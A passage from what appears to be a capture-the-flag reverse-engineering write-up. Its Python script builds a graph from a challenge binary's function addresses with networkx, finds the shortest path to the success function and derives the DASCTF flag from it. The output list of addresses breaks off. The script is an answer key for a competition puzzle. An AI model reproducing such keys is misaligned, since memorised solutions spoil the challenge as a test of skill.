[4253616, 4253936, None, None], [4253776, 4254096, None, None], [4253936, 4254240, None, None], [4254096, 4254400, None, None], [4254240, 4254544, None, None], [4254400, 4254704, None, None], [4254544, 4254848, None, None], [4254704, 4255008, None, None], [4254848, 4255152, None, None], [4255008, 4255312, None, None], [4255152, 4255472, None, None], [4255312, 4255616, None, None], [4255472, 4255776, None, None], [4255616, 4255936, None, None], [4255776, 4256080, None, None], [4255936, 4256240, None, None], [4256080, 4256400, None, None], [4256240, 4256560, None, None], [4256400, 4256704, None, None], [4256560, 4256848, None, None], [4256704, 4257008, None, None], [4256848, 4257152, None, None], [4257008, None, 4258400, None], [None, None, 4258544, 4248064], [None, None, 4258704, 4248224], [None, None, None, 4248384], [None, None, 4258864, 4248544], [None, None, 4259024, 4248704], [None, None, 4259184, 4248864], [None, None, 4259344, 4249344], [None, None, 4263760, 4257152], [None, None, 4263920, 4257312], [None, None, 4264080, 4257472], [None, None, 4265200, 4257760], [None, None, 4265344, 4257920], [None, None, 4265504, 4258080], [None, None, 4265648, 4258240], [None, 4259648, 4265792, None], [4259488, 4259808, None, None], [4259648, 4259968, None, None], [4259808, 4260128, None, None], [4259968, None, 4265952, None], [None, 4260448, 4266112, None], [4260288, 4260592, None, None], [4260448, 4260752, None, None], [4260592, 4260912, None, None], [4260752, 4261072, None, None], [4260912, 4261232, None, None], [4261072, 4261392, None, None], [4261232, 4261552, None, None], [4261392, 4261712, None, None], [4261552, 4261872, None, None], [4261712, 4262032, None, None], [4261872, 4262176, None, None], [4262032, 4262320, None, None], [4262176, 4262480, None, None], [4262320, 4262640, None, None], [4262480, 4262800, None, None], [4262640, 4262960, None, None], [4262800, 4263120, None, None], [4262960, 4263280, None, None], [4263120, 4263440, None, None], [4263280, 4263600, None, None], [4263440, None, 4266272, None], [None, None, 4268496, 4258400], [None, None, 4268656, 4258544], [None, 4264240, None, 4258704], [4264080, 4264400, None, None], [4264240, 4264560, None, None], [4264400, 4264720, None, None], [4264560, 4264880, None, None], [4264720, 4265040, None, None], [4264880, 4265200, None, None], [4265040, None, None, 4258864], [None, None, 4268816, 4259024], [None, None, 4268976, 4259184], [None, None, 4269136, 4259344], [None, None, 4269296, 4259488], [None, None, 4269456, 4260128], [None, None, 4269616, 4260288], [None, 4266432, None, 4263600], [4266272, 4266592, None, None], [4266432, 4266752, None, None], [4266592, 4266912, None, None], [4266752, 4267072, None, None], [4266912, 4267232, None, None], [4267072, 4267392, None, None], [4267232, 4267552, None, None], [4267392, 4267712, None, None], [4267552, 4267872, None, None], [4267712, 4268032, None, None], [4267872, 4268192, None, None], [4268032, 4268352, None, None], [4268192, 4268496, None, None], [4268352, None, None, 4263760], [None, None, 4269760, 4263920], [None, None, 4272288, 4265344], [None, None, 4272448, 4265504], [None, None, 4272608, 4265648], [None, None, 4273392, 4265792], [None, None, 4273552, 4265952], [None, None, 4273696, 4266112], [None, 4269920, None, 4268656], [4269760, 4270080, None, None], [4269920, 4270240, None, None], [4270080, 4270400, None, None], [4270240, 4270560, None, None], [4270400, 4270720, None, None], [4270560, 4270880, None, None], [4270720, 4271040, None, None], [4270880, 4271184, None, None], [4271040, 4271328, None, None], [4271184, 4271488, None, None], [4271328, 4271648, None, None], [4271488, 4271808, None, None], [4271648, 4271968, None, None], [4271808, 4272128, None, None], [4271968, 4272288, None, None], [4272128, None, None, 4268816], [None, None, 4274480, 4268976], [None, 4272768, None, 4269136], [4272608, 4272928, None, None], [4272768, 4273088, None, None], [4272928, 4273248, None, None], [4273088, 4273392, None, None], [4273248, None, None, 4269296], [None, None, 4274640, 4269456], [None, None, 4274800, 4269616], [None, 4274000, 4277808, None], [4273840, 4274160, None, None], [4274000, 4274320, None, None], [4274160, None, 4277968, None], [None, None, 4284896, 4272448], [None, None, 4286496, 4273552], [None, 4274960, None, 4273696], [4274800, 4275120, None, None], [4274960, 4275280, None, None], [4275120, 4275440, None, None], [4275280, 4275584, None, None], [4275440, 4275744, None, None], [4275584, 4275904, None, None], [4275744, 4276064, None, None], [4275904, 4276208, None, None], [4276064, 4276368, None, None], [4276208, 4276528, None, None], [4276368, 4276688, None, None], [4276528, 4276848, None, None], [4276688, 4277008, None, None], [4276848, 4277168, None, None], [4277008, 4277328, None, None], [4277168, 4277488, None, None], [4277328, 4277648, None, None], [4277488, 4277808, None, None], [4277648, None, None, 4273840], [None, 4278128, None, 4274320], [4277968, 4278288, None, None], [4278128, 4278448, None, None], [4278288, 4278608, None, None], [4278448, 4278768, None, None], [4278608, 4278928, None, None], [4278768, 4279072, None, None], [4278928, 4279216, None, None], [4279072, 4279376, None, None], [4279216, 4279536, None, None], [4279376, 4279696, None, None], [4279536, 4279840, None, None], [4279696, 4280000, None, None], [4279840, 4280160, None, None], [4280000, 4280304, None, None], [4280160, 4280464, None, None], [4280304, 4280624, None, None], [4280464, 4280784, None, None], [4280624, 4280944, None, None], [4280784, 4281088, None, None], [4280944, 4281248, None, None], [4281088, 4281408, None, None], [4281248, 4281568, None, None], [4281408, 4281728, None, None], [4281568, 4281888, None, None], [4281728, 4282048, None, None], [4281888, 4282208, None, None], [4282048, 4282352, None, None], [4282208, 4282512, None, None], [4282352, 4282656, None, None], [4282512, 4282816, None, None], [4282656, 4282976, None, None], [4282816, 4283136, None, None], [4282976, 4283296, None, None], [4283136, 4283456, None, None], [4283296, 4283616, None, None], [4283456, 4283776, None, None], [4283616, 4283936, None, None], [4283776, 4284096, None, None], [4283936, 4284256, None, None], [4284096, 4284416, None, None], [4284256, 4284576, None, None], [4284416, 4284736, None, None], [4284576, 4284896, None, None], [4284736, None, None, 4274480], [None, 4285216, 4286656, None], [4285056, 4285376, None, None], [4285216, 4285536, None, None], [4285376, 4285696, None, None], [4285536, 4285856, None, None], [4285696, 4286016, None, None], [4285856, 4286176, None, None], [4286016, 4286336, None, None], [4286176, 4286496, None, None], [4286336, None, None, 4274640], [None, None, 4296976, 4285056], [None, 4286976, 4297136, None], [4286816, 4287120, None, None], [4286976, 4287264, None, None], [4287120, 4287424, None, None], [4287264, 4287584, None, None], [4287424, 4287744, None, None], [4287584, 4287904, None, None], [4287744, 4288064, None, None], [4287904, 4288224, None, None], [4288064, 4288384, None, None], [4288224, 4288528, None, None], [4288384, 4288688, None, None], [4288528, 4288848, None, None], [4288688, 4288992, None, None], [4288848, 4289152, None, None], [4288992, 4289312, None, None], [4289152, 4289472, None, None], [4289312, 4289632, None, None], [4289472, 4289792, None, None], [4289632, 4289952, None, None], [4289792, 4290112, None, None], [4289952, 4290272, None, None], [4290112, 4290432, None, None], [4290272, 4290592, None, None], [4290432, 4290752, None, None], [4290592, 4290912, None, None], [4290752, 4291072, None, None], [4290912, 4291232, None, None], [4291072, 4291376, None, None], [4291232, 4291536, None, None], [4291376, 4291696, None, None], [4291536, 4291856, None, None], [4291696, 4292000, None, None], [4291856, 4292144, None, None], [4292000, 4292288, None, None], [4292144, 4292448, None, None], [4292288, 4292608, None, None], [4292448, 4292768, None, None], [4292608, 4292928, None, None], [4292768, 4293088, None, None], [4292928, 4293248, None, None], [4293088, 4293392, None, None], [4293248, 4293552, None, None], [4293392, 4293696, None, None], [4293552, 4293856, None, None], [4293696, 4294016, None, None], [4293856, 4294160, None, None], [4294016, 4294320, None, None], [4294160, 4294480, 4297296, None], [4294320, 4294640, None, None], [4294480, 4294800, None, None], [4294640, 4294944, None, None], [4294800, 4295088, None, None], [4294944, 4295232, None, None], [4295088, 4295392, None, None], [4295232, 4295552, None, None], [4295392, 4295696, None, None], [4295552, 4295856, None, None], [4295696, 4296016, None, None], [4295856, 4296176, None, None], [4296016, 4296336, None, None], [4296176, 4296496, None, None], [4296336, 4296656, None, None], [4296496, 4296816, None, None], [4296656, None, 4297424, None], [None, None, 4297584, 4286656], [None, None, 4297744, 4286816], [None, None, 4297904, 4294320], [None, None, 4299472, 4296816], [None, None, 4300720, 4296976], [None, None, 4302288, 4297136], [None, None, 4308576, 4297296], [None, 4298224, 4308720, None], [4298064, 4298384, None, None], [4298224, 4298528, None, None], [4298384, 4298688, None, None], [4298528, 4298848, None, None], [4298688, 4299008, None, None], [4298848, 4299168, None, None], [4299008, 4299312, None, None], [4299168, 4299472, None, None], [4299312, 4299632, None, 4297424], [4299472, 4299792, None, None], [4299632, 4299936, None, None], [4299792, 4300096, None, None], [4299936, 4300256, None, None], [4300096, 4300416, None, None], [4300256, 4300576, None, None], [4300416, None, None, None], [None, 4300864, None, 4297584], [4300720, 4301024, None, None], [4300864, 4301184, None, None], [4301024, 4301344, None, None], [4301184, 4301504, None, None], [4301344, 4301648, None, None], [4301504, 4301808, None, None], [4301648, 4301968, None, None], [4301808, 4302128, None, None], [4301968, 4302288, None, None], [4302128, 4302448, None, 4297744], [4302288, 4302608, None, None], [4302448, 4302768, None, None], [4302608, 4302912, None, None], [4302768, 4303072, None, None], [4302912, 4303232, None, None], [4303072, 4303392, None, None], [4303232, 4303552, None, None], [4303392, 4303712, None, None], [4303552, 4303872, None, None], [4303712, 4304032, None, None], [4303872, 4304192, None, None], [4304032, 4304352, None, None], [4304192, 4304496, None, None], [4304352, 4304656, None, None], [4304496, 4304816, None, None], [4304656, 4304976, None, None], [4304816, 4305136, None, None], [4304976, 4305296, None, None], [4305136, 4305456, None, None], [4305296, 4305616, None, None], [4305456, 4305776, None, None], [4305616, 4305936, None, None], [4305776, 4306096, None, None], [4305936, 4306256, None, None], [4306096, 4306400, None, None], [4306256, 4306560, None, None], [4306400, 4306720, None, None], [4306560, 4306880, None, None], [4306720, 4307024, None, None], [4306880, 4307184, None, None], [4307024, 4307344, None, None], [4307184, 4307504, None, None], [4307344, 4307664, None, None], [4307504, 4307808, None, None], [4307664, 4307968, None, None], [4307808, 4308128, None, None], [4307968, 4308288, None, None], [4308128, 4308448, None, None], [4308288, None, None, None], [None, None, 4308880, 4297904], [None, None, 4309040, 4298064], [None, None, 4311264, 4308576], [None, None, 4311888, 4308720], [None, 4309360, 4312336, None], [4309200, 4309520, 4312496, None], [4309360, None, 4312624, None], [None, None, 4313872, None], [None, 4309984, 4315312, None], [4309824, None, 4315472, None], [None, 4310304, 4316112, None], [4310144, 4310464, 4316272, None], [4310304, 4310624, 4316432, None], [4310464, 4310784, 4316592, None], [4310624, 4310944, 4316736, None], [4310784, 4311104, 4316896, None], [4310944, None, 4317024, None], [None, 4311424, 4317664, 4308880], [4311264, 4311584, 4317824, None], [4311424, 4311744, 4317984, None], [4311584, None, 4318112, None], [None, None, 4318752, 4309040], [None, 4312176, None, None], [4312048, 4312336, 4318896, None], [4312176, 4312496, None, 4309200], [4312336, 4312624, None, 4309360], [4312496, 4312784, None, 4309520], [4312624, 4312928, None, None], [4312784, 4313088, None, None], [4312928, 4313248, None, None], [4313088, 4313408, None, None], [4313248, 4313568, None, None], [4313408, 4313712, None, None], [4313568, 4313872, 4319056, None], [4313712, 4314032, None, 4309680], [4313872, 4314192, 4319200, None], [4314032, 4314352, None, None], [4314192, 4314512, None, None], [4314352, 4314672, None, None], [4314512, 4314832, None, None], [4314672, 4314992, None, None], [4314832, 4315152, None, None], [4314992, 4315312, 4319328, None], [4315152, 4315472, None, 4309824], [4315312, 4315632, None, 4309984], [4315472, 4315792, 4319472, None], [4315632, 4315952, None, None], [4315792, 4316112, None, None], [4315952, 4316272, None, 4310144], [4316112, 4316432, None, 4310304], [4316272, 4316592, None, 4310464], [4316432, 4316736, 4319616, 4310624], [4316592, 4316896, None, 4310784], [4316736, 4317024, None, 4310944], [4316896, 4317184, None, 4311104], [4317024, 4317344, None, None], [4317184, 4317504, None, None], [4317344, 4317664, 4319760, None], [4317504, 4317824, None, 4311264], [4317664, 4317984, None, 4311424], [4317824, 4318112, None, 4311584], [4317984, 4318272, None, 4311744], [4318112, 4318432, None, None], [4318272, 4318592, None, None], [4318432, 4318752, None, None], [4318592, None, None, 4311888], [None, None, 4319920, 4312176], [None, None, None, 4313712], [None, None, None, 4314032], [None, None, None, 4315152], [None, None, None, 4315632], [None, None, 4320080, 4316592], [None, None, 4320240, 4317504], [None, None, 4321472, 4318896], [None, None, 4321600, 4319616], [None, 4320400, 4321760, 4319760], [4320240, 4320560, None, None], [4320400, 4320720, None, None], [4320560, 4320880, None, None], [4320720, 4321024, None, None], [4320880, 4321184, None, None], [4321024, 4321344, None, None], [4321184, None, None, None], [None, None, None, 4319920], [None, None, 4321904, 4320080], [None, None, None, 4320240], [None, None, None, 4321600]]func_list = [4198480, 4198624, 4198784, 4198944, 4199104, 4199264, 4199424, 4199584, 4199744, 4199904, 4200064, 4200224, 4200384, 4200544, 4200688, 4200848, 4201008, 4201168, 4201312, 4201456, 4201616, 4201776, 4201936, 4202096, 4202240, 4202384, 4202544, 4202704, 4202848, 4203008, 4203168, 4203328, 4203488, 4203648, 4203808, 4203968, 4204128, 4204272, 4204432, 4204592, 4204752, 4204912, 4205056, 4205216, 4205376, 4205536, 4205680, 4205824, 4205984, 4206144, 4206304, 4206448, 4206608, 4206768, 4206928, 4207088, 4207232, 4207392, 4207552, 4207712, 4207872, 4208032, 4208192, 4208352, 4208496, 4208656, 4208816, 4208960, 4209120, 4209280, 4209440, 4209600, 4209760, 4209904, 4210064, 4210224, 4210368, 4210528, 4210688, 4210832, 4210992, 4211152, 4211312, 4211472, 4211632, 4211792, 4211952, 4212112, 4212272, 4212432, 4212592, 4212752, 4212912, 4213072, 4213232, 4213392, 4213552, 4213696, 4213856, 4214016, 4214176, 4214320, 4214480, 4214640, 4214800, 4214960, 4215120, 4215280, 4215440, 4215584, 4215744, 4215904, 4216064, 4216208, 4216352, 4216512, 4216672, 4216832, 4216992, 4217136, 4217296, 4217440, 4217600, 4217760, 4217920, 4218080, 4218240, 4218400, 4218560, 4218720, 4218880, 4219040, 4219200, 4219360, 4219520, 4219680, 4219840, 4219984, 4220144, 4220304, 4220464, 4220608, 4220768, 4220928, 4221088, 4221232, 4221392, 4221552, 4221712, 4221872, 4222032, 4222192, 4222352, 4222496, 4222640, 4222800, 4222928, 4223088, 4223248, 4223408, 4223568, 4223712, 4223856, 4224016, 4224176, 4224336, 4224496, 4224656, 4224816, 4224976, 4225120, 4225264, 4225424, 4225584, 4225744, 4225888, 4226048, 4226208, 4226368, 4226528, 4226688, 4226848, 4227008, 4227168, 4227328, 4227488, 4227648, 4227808, 4227968, 4228112, 4228272, 4228416, 4228576, 4228736, 4228896, 4229056, 4229216, 4229376, 4229520, 4229680, 4229840, 4229984, 4230144, 4230288, 4230448, 4230608, 4230768, 4230928, 4231088, 4231248, 4231408, 4231568, 4231728, 4231888, 4232048, 4232208, 4232368, 4232528, 4232672, 4232832, 4232992, 4233152, 4233312, 4233472, 4233616, 4233776, 4233920, 4234080, 4234240, 4234400, 4234560, 4234720, 4234880, 4235040, 4235200, 4235328, 4235488, 4235632, 4235792, 4235952, 4236112, 4236272, 4236432, 4236576, 4236736, 4236896, 4237056, 4237216, 4237376, 4237520, 4237664, 4237824, 4237984, 4238144, 4238304, 4238464, 4238624, 4238784, 4238944, 4239104, 4239264, 4239424, 4239584, 4239744, 4239904, 4240064, 4240224, 4240368, 4240528, 4240688, 4240848, 4241008, 4241168, 4241312, 4241456, 4241616, 4241776, 4241936, 4242096, 4242256, 4242416, 4242576, 4242736, 4242896, 4243040, 4243200, 4243360, 4243504, 4243664, 4243824, 4243984, 4244144, 4244288, 4244448, 4244608, 4244768, 4244928, 4245072, 4245232, 4245392, 4245536, 4245696, 4245840, 4246000, 4246160, 4246320, 4246480, 4246640, 4246800, 4246960, 4247120, 4247280, 4247440, 4247600, 4247744, 4247904, 4248064, 4248224, 4248384, 4248544, 4248704, 4248864, 4249024, 4249184, 4249344, 4249504, 4249664, 4249824, 4249984, 4250144, 4250304, 4250464, 4250624, 4250784, 4250944, 4251088, 4251248, 4251408, 4251568, 4251712, 4251872, 4252032, 4252192, 4252336, 4252496, 4252656, 4252816, 4252976, 4253136, 4253296, 4253456, 4253616, 4253776, 4253936, 4254096, 4254240, 4254400, 4254544, 4254704, 4254848, 4255008, 4255152, 4255312, 4255472, 4255616, 4255776, 4255936, 4256080, 4256240, 4256400, 4256560, 4256704, 4256848, 4257008, 4257152, 4257312, 4257472, 4257632, 4257760, 4257920, 4258080, 4258240, 4258400, 4258544, 4258704, 4258864, 4259024, 4259184, 4259344, 4259488, 4259648, 4259808, 4259968, 4260128, 4260288, 4260448, 4260592, 4260752, 4260912, 4261072, 4261232, 4261392, 4261552, 4261712, 4261872, 4262032, 4262176, 4262320, 4262480, 4262640, 4262800, 4262960, 4263120, 4263280, 4263440, 4263600, 4263760, 4263920, 4264080, 4264240, 4264400, 4264560, 4264720, 4264880, 4265040, 4265200, 4265344, 4265504, 4265648, 4265792, 4265952, 4266112, 4266272, 4266432, 4266592, 4266752, 4266912, 4267072, 4267232, 4267392, 4267552, 4267712, 4267872, 4268032, 4268192, 4268352, 4268496, 4268656, 4268816, 4268976, 4269136, 4269296, 4269456, 4269616, 4269760, 4269920, 4270080, 4270240, 4270400, 4270560, 4270720, 4270880, 4271040, 4271184, 4271328, 4271488, 4271648, 4271808, 4271968, 4272128, 4272288, 4272448, 4272608, 4272768, 4272928, 4273088, 4273248, 4273392, 4273552, 4273696, 4273840, 4274000, 4274160, 4274320, 4274480, 4274640, 4274800, 4274960, 4275120, 4275280, 4275440, 4275584, 4275744, 4275904, 4276064, 4276208, 4276368, 4276528, 4276688, 4276848, 4277008, 4277168, 4277328, 4277488, 4277648, 4277808, 4277968, 4278128, 4278288, 4278448, 4278608, 4278768, 4278928, 4279072, 4279216, 4279376, 4279536, 4279696, 4279840, 4280000, 4280160, 4280304, 4280464, 4280624, 4280784, 4280944, 4281088, 4281248, 4281408, 4281568, 4281728, 4281888, 4282048, 4282208, 4282352, 4282512, 4282656, 4282816, 4282976, 4283136, 4283296, 4283456, 4283616, 4283776, 4283936, 4284096, 4284256, 4284416, 4284576, 4284736, 4284896, 4285056, 4285216, 4285376, 4285536, 4285696, 4285856, 4286016, 4286176, 4286336, 4286496, 4286656, 4286816, 4286976, 4287120, 4287264, 4287424, 4287584, 4287744, 4287904, 4288064, 4288224, 4288384, 4288528, 4288688, 4288848, 4288992, 4289152, 4289312, 4289472, 4289632, 4289792, 4289952, 4290112, 4290272, 4290432, 4290592, 4290752, 4290912, 4291072, 4291232, 4291376, 4291536, 4291696, 4291856, 4292000, 4292144, 4292288, 4292448, 4292608, 4292768, 4292928, 4293088, 4293248, 4293392, 4293552, 4293696, 4293856, 4294016, 4294160, 4294320, 4294480, 4294640, 4294800, 4294944, 4295088, 4295232, 4295392, 4295552, 4295696, 4295856, 4296016, 4296176, 4296336, 4296496, 4296656, 4296816, 4296976, 4297136, 4297296, 4297424, 4297584, 4297744, 4297904, 4298064, 4298224, 4298384, 4298528, 4298688, 4298848, 4299008, 4299168, 4299312, 4299472, 4299632, 4299792, 4299936, 4300096, 4300256, 4300416, 4300576, 4300720, 4300864, 4301024, 4301184, 4301344, 4301504, 4301648, 4301808, 4301968, 4302128, 4302288, 4302448, 4302608, 4302768, 4302912, 4303072, 4303232, 4303392, 4303552, 4303712, 4303872, 4304032, 4304192, 4304352, 4304496, 4304656, 4304816, 4304976, 4305136, 4305296, 4305456, 4305616, 4305776, 4305936, 4306096, 4306256, 4306400, 4306560, 4306720, 4306880, 4307024, 4307184, 4307344, 4307504, 4307664, 4307808, 4307968, 4308128, 4308288, 4308448, 4308576, 4308720, 4308880, 4309040, 4309200, 4309360, 4309520, 4309680, 4309824, 4309984, 4310144, 4310304, 4310464, 4310624, 4310784, 4310944, 4311104, 4311264, 4311424, 4311584, 4311744, 4311888, 4312048, 4312176, 4312336, 4312496, 4312624, 4312784, 4312928, 4313088, 4313248, 4313408, 4313568, 4313712, 4313872, 4314032, 4314192, 4314352, 4314512, 4314672, 4314832, 4314992, 4315152, 4315312, 4315472, 4315632, 4315792, 4315952, 4316112, 4316272, 4316432, 4316592, 4316736, 4316896, 4317024, 4317184, 4317344, 4317504, 4317664, 4317824, 4317984, 4318112, 4318272, 4318432, 4318592, 4318752, 4318896, 4319056, 4319200, 4319328, 4319472, 4319616, 4319760, 4319920, 4320080, 4320240, 4320400, 4320560, 4320720, 4320880, 4321024, 4321184, 4321344, 4321472, 4321600, 4321760, 4321904]src_node = 0x401050 # 起点target_node = 0x41F1E0 # 终点G = nx.MultiDiGraph() # 生成一张空图，Mul允许2个节点之间存在多个边，Di代表边是有方向的for i in func_list: G.add_node(i) # 添加节点for i, value in enumerate(all_edges): src = func_list[i] for j in value: if j != None: # 不为None,就可以构造一条边 dst = j G.add_edge(src, dst)path = nx.shortest_path(G, source = src_node, target = target_node) # 直接调用此函数就可以求出最短路径经过的那几个节点print(len(path))print([hex(i) for i in path])s = &quot;&quot; for i in range(1, len(path)): # 根据得到的结果来求出每一步走的方向 func_index = func_list.index(path[i - 1]) index = all_edges[func_index].index(path[i]) if index == 0: s += &#x27;a&#x27; elif index == 1: s += &#x27;d&#x27; elif index == 2: s += &#x27;s&#x27; else: s += &#x27;w&#x27;# 成功的地方在41F1E0处# case &#x27;s&#x27;:# result = printf(&quot;Great!!!you got it!flag is DASCTF&#123;md5&#123;your input&#125;\\n&quot;);# break;input_ = s + &#x27;s&#x27;print(input_) # DASCTF&#123;md5&#123;your input&#125;\\n&quot;)print(&quot;DASCTF&#123;%s&#125;&quot; % hashlib.md5(input_.encode()).hexdigest())、 输出 1234496[&#x27;0x401050&#x27;, &#x27;0x4010e0&#x27;, &#x27;0x401180&#x27;, &#x27;0x403460&#x27;, &#x27;0x403500&#x27;, &#x27;0x4035a0&#x27;, &#x27;0x403640&#x27;, &#x27;0x4036e0&#x27;, &#x27;0x403770&#x27;, &#x27;0x403810&#x27;, &#x27;0x4038b0&#x27;, &#x27;0x403940&#x27;, &#x27;0x4039e0&#x27;, &#x27;0x403a80&#x27;, &#x27;0x403b20&#x27;, &#x27;0x403bc0&#x27;, &#x27;0x403c60&#x27;, &#x27;0x403cf0&#x27;, &#x27;0x403d90&#x27;, &#x27;0x403e30&#x27;, &#x27;0x403ec0&#x27;, &#x27;0x403f60&#x27;, &#x27;0x404630&#x27;, &#x27;0x405e20&#x27;, &#x27;0x406450&#x27;, &#x27;0x406eb0&#x27;, &#x27;0x408060&#x27;, &#x27;0x4087c0&#x27;, &#x27;0x4097c0&#x27;, &#x27;0x40a520&#x27;, &#x27;0x40b490&#x27;, &#x27;0x40b970&#x27;, &#x27;0x40ba10&#x27;, &#x27;0x40bab0&#x27;, &#x27;0x40bb50&#x27;, &#x27;0x40bbf0&#x27;, &#x27;0x40bc90&#x27;, &#x27;0x40bd30&#x27;, &#x27;0x40bdd0&#x27;, &#x27;0x40be60&#x27;, &#x27;0x40bf00&#x27;, &#x27;0x40bfa0&#x27;, &#x27;0x40c030&#x27;, &#x27;0x40c0d0&#x27;, &#x27;0x40c170&#x27;, &#x27;0x40c210&#x27;, &#x27;0x40c2b0&#x27;, &#x27;0x40c340&#x27;, &#x27;0x40c3e0&#x27;, &#x27;0x40c480&#x27;, &#x27;0x40c520&#x27;, &#x27;0x40c5c0&#x27;, &#x27;0x40c650&#x27;, &#x27;0x40c6f0&#x27;, &#x27;0x40c790&#x27;, &#x27;0x40c820&#x27;, &#x27;0x40c8c0&#x27;, &#x27;0x40c950&#x27;, &#x27;0x40c9f0&#x27;, &#x27;0x40ca90&#x27;, &#x27;0x40cb30&#x27;, &#x27;0x40cbd0&#x27;, &#x27;0x40cc70&#x27;, &#x27;0x40b530&#x27;, &#x27;0x40ae60&#x27;, &#x27;0x409990&#x27;, &#x27;0x408f10&#x27;, &#x27;0x408240&#x27;, &#x27;0x407990&#x27;, &#x27;0x4078f0&#x27;, &#x27;0x407860&#x27;, &#x27;0x4077d0&#x27;, &#x27;0x407730&#x27;, &#x27;0x407690&#x27;, &#x27;0x4075f0&#x27;, &#x27;0x407550&#x27;, &#x27;0x4074b0&#x27;, &#x27;0x407410&#x27;, &#x27;0x4081a0&#x27;, &#x27;0x408ad0&#x27;, &#x27;0x408b60&#x27;, &#x27;0x408c00&#x27;, &#x27;0x408c90&#x27;, &#x27;0x408d30&#x27;, &#x27;0x408dd0&#x27;, &#x27;0x408e70&#x27;, &#x27;0x409900&#x27;, &#x27;0x40adc0&#x27;, &#x27;0x40ad20&#x27;, &#x27;0x40ac80&#x27;, &#x27;0x40abe0&#x27;, &#x27;0x40ab40&#x27;, &#x27;0x40aaa0&#x27;, &#x27;0x40aa00&#x27;, &#x27;0x40a960&#x27;, &#x27;0x40a8d0&#x27;, &#x27;0x40a840&#x27;, &#x27;0x40a7a0&#x27;, &#x27;0x40a700&#x27;, &#x27;0x40a660&#x27;, &#x27;0x40a5c0&#x27;, &#x27;0x409860&#x27;, &#x27;0x408860&#x27;, &#x27;0x408900&#x27;, &#x27;0x408990&#x27;, &#x27;0x408a30&#x27;, &#x27;0x408100&#x27;, &#x27;0x407370&#x27;, &#x27;0x406590&#x27;, &#x27;0x405f60&#x27;, &#x27;0x404770&#x27;, &#x27;0x404810&#x27;, &#x27;0x4048b0&#x27;, &#x27;0x404950&#x27;, &#x27;0x4049f0&#x27;, &#x27;0x404a90&#x27;, &#x27;0x404b30&#x27;, &#x27;0x404bc0&#x27;, &#x27;0x404c60&#x27;, &#x27;0x404d00&#x27;, &#x27;0x404da0&#x27;, &#x27;0x404e30&#x27;, &#x27;0x404ed0&#x27;, &#x27;0x404f70&#x27;, &#x27;0x405010&#x27;, &#x27;0x4050b0&#x27;, &#x27;0x405150&#x27;, &#x27;0x4051f0&#x27;, &#x27;0x405290&#x27;, &#x27;0x405320&#x27;, &#x27;0x4053c0&#x27;, &#x27;0x405460&#x27;, &#x27;0x405500&#x27;, &#x27;0x405590&#x27;, &#x27;0x405620&#x27;, &#x27;0x4056c0&#x27;, &#x27;0x405760&#x27;, &#x27;0x406000&#x27;, &#x27;0x406630&#x27;, &#x27;0x407a30&#x27;, &#x27;0x4082e0&#x27;, &#x27;0x408fb0&#x27;, &#x27;0x409a30&#x27;, &#x27;0x40af00&#x27;, &#x27;0x40b5d0&#x27;, &#x27;0x40cd10&#x27;, &#x27;0x40d200&#x27;, &#x27;0x40f620&#x27;, &#x27;0x40faf0&#x27;, &#x27;0x410ff0&#x27;, &#x27;0x412270&#x27;, &#x27;0x4126c0&#x27;, &#x27;0x412760&#x27;, &#x27;0x412800&#x27;, &#x27;0x4128a0&#x27;, &#x27;0x412940&#x27;, &#x27;0x4129e0&#x27;, &#x27;0x412a80&#x27;, &#x27;0x412b20&#x27;, &#x27;0x412bc0&#x27;, &#x27;0x412c50&#x27;, &#x27;0x412ce0&#x27;, &#x27;0x412d80&#x27;, &#x27;0x412e20&#x27;, &#x27;0x412ec0&#x27;, &#x27;0x412f60&#x27;, &#x27;0x413000&#x27;, &#x27;0x4130a0&#x27;, &#x27;0x412310&#x27;, &#x27;0x411580&#x27;, &#x27;0x40fcd0&#x27;, &#x27;0x40f880&#x27;, &#x27;0x40d480&#x27;, &#x27;0x40cf90&#x27;, &#x27;0x40b830&#x27;, &#x27;0x40b180&#x27;, &#x27;0x409ca0&#x27;, &#x27;0x409410&#x27;, &#x27;0x408410&#x27;, &#x27;0x407b60&#x27;, &#x27;0x406bb0&#x27;, &#x27;0x406b10&#x27;, &#x27;0x406a70&#x27;, &#x27;0x4069d0&#x27;, &#x27;0x406930&#x27;, &#x27;0x4068a0&#x27;, &#x27;0x406800&#x27;, &#x27;0x406760&#x27;, &#x27;0x406140&#x27;, &#x27;0x4058a0&#x27;, &#x27;0x404450&#x27;, &#x27;0x402c70&#x27;, &#x27;0x402d00&#x27;, &#x27;0x402da0&#x27;, &#x27;0x402e40&#x27;, &#x27;0x402ee0&#x27;, &#x27;0x402f70&#x27;, &#x27;0x403010&#x27;, &#x27;0x4030b0&#x27;, &#x27;0x403150&#x27;, &#x27;0x4031f0&#x27;, &#x27;0x403280&#x27;, &#x27;0x403320&#x27;, &#x27;0x4033c0&#x27;, &#x27;0x4044f0&#x27;, &#x27;0x405930&#x27;, &#x27;0x4061e0&#x27;, &#x27;0x406c50&#x27;, &#x27;0x407c00&#x27;, &#x27;0x4084b0&#x27;, &#x27;0x408540&#x27;, &#x27;0x4094b0&#x27;, &#x27;0x409550&#x27;, &#x27;0x409d40&#x27;, &#x27;0x409de0&#x27;, &#x27;0x40b220&#x27;, &#x27;0x40b8d0&#x27;, &#x27;0x40d160&#x27;, &#x27;0x40d0c0&#x27;, &#x27;0x40d660&#x27;, &#x27;0x40d5c0&#x27;, &#x27;0x40d520&#x27;, &#x27;0x40f920&#x27;, &#x27;0x40fd70&#x27;, &#x27;0x411620&#x27;, &#x27;0x4123b0&#x27;, &#x27;0x413140&#x27;, &#x27;0x413930&#x27;, &#x27;0x4161e0&#x27;, &#x27;0x416140&#x27;, &#x27;0x4160a0&#x27;, &#x27;0x416000&#x27;, &#x27;0x415f60&#x27;, &#x27;0x415ec0&#x27;, &#x27;0x415e20&#x27;, &#x27;0x415d80&#x27;, &#x27;0x415ce0&#x27;, &#x27;0x415c40&#x27;, &#x27;0x415ba0&#x27;, &#x27;0x415b00&#x27;, &#x27;0x415a60&#x27;, &#x27;0x4159c0&#x27;, &#x27;0x415920&#x27;, &#x27;0x415890&#x27;, &#x27;0x4157f0&#x27;, &#x27;0x415760&#x27;, &#x27;0x4156c0&#x27;, &#x27;0x415620&#x27;, &#x27;0x415580&#x27;, &#x27;0x4154e0&#x27;, &#x27;0x415440&#x27;, &#x27;0x4153a0&#x27;, &#x27;0x415300&#x27;, &#x27;0x415270&#x27;, &#x27;0x4151d0&#x27;, &#x27;0x415130&#x27;, &#x27;0x415090&#x27;, &#x27;0x414ff0&#x27;, &#x27;0x414f60&#x27;, &#x27;0x414ec0&#x27;, 